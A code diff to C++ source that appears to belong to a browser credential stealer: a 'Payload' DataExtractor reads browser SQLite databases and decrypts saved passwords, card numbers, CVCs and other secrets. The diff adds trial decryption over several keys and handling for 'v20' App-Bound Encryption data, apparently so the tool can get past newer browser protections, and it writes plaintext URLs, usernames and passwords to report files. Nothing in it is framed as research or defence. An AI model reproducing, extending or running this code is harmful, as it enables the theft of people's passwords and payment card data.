@@ -16,8 +16,8 @@
 
 namespace Payload {
 
-    DataExtractor::DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::filesystem::path& outputBase, bool isGecko)
-        : m_pipe(pipe), m_key(key), m_outputBase(outputBase), m_isGecko(isGecko) {}
+    DataExtractor::DataExtractor(PipeClient& pipe, const std::vector<std::vector<uint8_t>>& keys, const std::filesystem::path& outputBase, bool isGecko)
+        : m_pipe(pipe), m_keys(keys), m_outputBase(outputBase), m_isGecko(isGecko) {}
 
     sqlite3* DataExtractor::OpenDatabase(const std::filesystem::path& dbPath) {
         sqlite3* db = nullptr;
@@ -200,10 +200,16 @@ namespace Payload {
             int blobLen = sqlite3_column_bytes(stmt, 6);
             if (blob && blobLen > 0) {
                 std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
-                auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
+                bool isV20 = (blobLen > 3 && memcmp(blob, "v20", 3) == 0);
+
+                std::optional<std::vector<uint8_t>> decrypted;
+                for (const auto& key : m_keys) {
+                    decrypted = Crypto::AesGcm::Decrypt(key, encrypted);
+                    if (decrypted && !decrypted->empty()) break;
+                }
                 if (decrypted && !decrypted->empty()) {
                     std::string val;
-                    if (decrypted->size() > 32) {
+                    if (isV20 && decrypted->size() > 32) {
                         val = std::string((char*)decrypted->data() + 32, decrypted->size() - 32);
                     } else {
                         val = std::string((char*)decrypted->data(), decrypted->size());
@@ -246,26 +252,40 @@ namespace Payload {
         sqlite3_stmt* stmt;
         const char* query = "SELECT origin_url, username_value, password_value FROM logins";
         if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;
-
+ 
         std::ofstream out(outFile);
         out << "================================================================================\n";
         out << "                                BROWSER PASSWORDS                               \n";
         out << "================================================================================\n\n";
-
+ 
         int count = 0;
         while (sqlite3_step(stmt) == SQLITE_ROW) {
             const void* blob = sqlite3_column_blob(stmt, 2);
             int blobLen = sqlite3_column_bytes(stmt, 2);
             if (blob && blobLen > 0) {
                 std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
-                auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
-                if (decrypted) {
-                    std::string val((char*)decrypted->data(), decrypted->size());
+                bool isV20 = (blobLen > 3 && memcmp(blob, "v20", 3) == 0);
+                
+                std::optional<std::vector<uint8_t>> decrypted;
+                for (const auto& key : m_keys) {
+                    decrypted = Crypto::AesGcm::Decrypt(key, encrypted);
+                    if (decrypted && !decrypted->empty()) break;
+                }
+ 
+                if (decrypted && !decrypted->empty()) {
+                    std::string val;
+                    // Pro-grade truncation: only skip 32 bytes if it's confirmed V20 ABE data
+                    if (isV20 && decrypted->size() > 32) {
+                        val = std::string((char*)decrypted->data() + 32, decrypted->size() - 32);
+                    } else {
+                        val = std::string((char*)decrypted->data(), decrypted->size());
+                    }
+ 
                     const char* url_text = (const char*)sqlite3_column_text(stmt, 0);
                     const char* user_text = (const char*)sqlite3_column_text(stmt, 1);
                     std::string url = url_text ? url_text : "N/A";
                     std::string user = user_text ? user_text : "N/A";
-
+ 
                     out << "URL:      " << url << "\n"
                         << "User:     " << user << "\n"
                         << "Password: " << val << "\n"
@@ -289,8 +309,12 @@ namespace Payload {
                 int len = sqlite3_column_bytes(stmt, 1);
                 if (guid && blob && len > 0) {
                     std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
-                    auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
-                    if (dec) cvcMap[guid] = std::string((char*)dec->data(), dec->size());
+                    std::optional<std::vector<uint8_t>> dec;
+                    for (const auto& key : m_keys) {
+                        dec = Crypto::AesGcm::Decrypt(key, enc);
+                        if (dec && !dec->empty()) break;
+                    }
+                    if (dec && !dec->empty()) cvcMap[guid] = std::string((char*)dec->data(), dec->size());
                 }
             }
             sqlite3_finalize(stmt);
@@ -312,8 +336,12 @@ namespace Payload {
             
             if (blob && len > 0) {
                 std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
-                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
-                if (dec) {
+                std::optional<std::vector<uint8_t>> dec;
+                for (const auto& key : m_keys) {
+                    dec = Crypto::AesGcm::Decrypt(key, enc);
+                    if (dec && !dec->empty()) break;
+                }
+                if (dec && !dec->empty()) {
                     std::string num((char*)dec->data(), dec->size());
                     std::string cvc = (guid && cvcMap.count(guid)) ? cvcMap[guid] : "N/A";
                     const char* name_text = (const char*)sqlite3_column_text(stmt, 1);
@@ -345,8 +373,12 @@ namespace Payload {
             
             if (blob && len > 0) {
                 std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
-                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
-                if (dec) {
+                std::optional<std::vector<uint8_t>> dec;
+                for (const auto& key : m_keys) {
+                    dec = Crypto::AesGcm::Decrypt(key, enc);
+                    if (dec && !dec->empty()) break;
+                }
+                if (dec && !dec->empty()) {
                     std::string val((char*)dec->data(), dec->size());
                     std::stringstream ss;
                     ss << "{\"nickname\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
@@ -383,8 +415,12 @@ namespace Payload {
             
             if (blob && len > 0) {
                 std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
-                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
-                if (dec) {
+                std::optional<std::vector<uint8_t>> dec;
+                for (const auto& key : m_keys) {
+                    dec = Crypto::AesGcm::Decrypt(key, enc);
+                    if (dec && !dec->empty()) break;
+                }
+                if (dec && !dec->empty()) {
                     std::string val((char*)dec->data(), dec->size());
                     std::string bindingKey = "";
                     
@@ -393,8 +429,12 @@ namespace Payload {
                         int bKeyLen = sqlite3_column_bytes(stmt, 2);
                         if (bKeyBlob && bKeyLen > 0) {
                             std::vector<uint8_t> encKey((uint8_t*)bKeyBlob, (uint8_t*)bKeyBlob + bKeyLen);
-                            auto decKey = Crypto::AesGcm::Decrypt(m_key, encKey);
-                            if (decKey) {
+                            std::optional<std::vector<uint8_t>> decKey;
+                            for (const auto& key : m_keys) {
+                                decKey = Crypto::AesGcm::Decrypt(key, encKey);
+                                if (decKey && !decKey->empty()) break;
+                            }
+                            if (decKey && !decKey->empty()) {
                                 bindingKey = std::string((char*)decKey->data(), decKey->size());
                             }
                         }
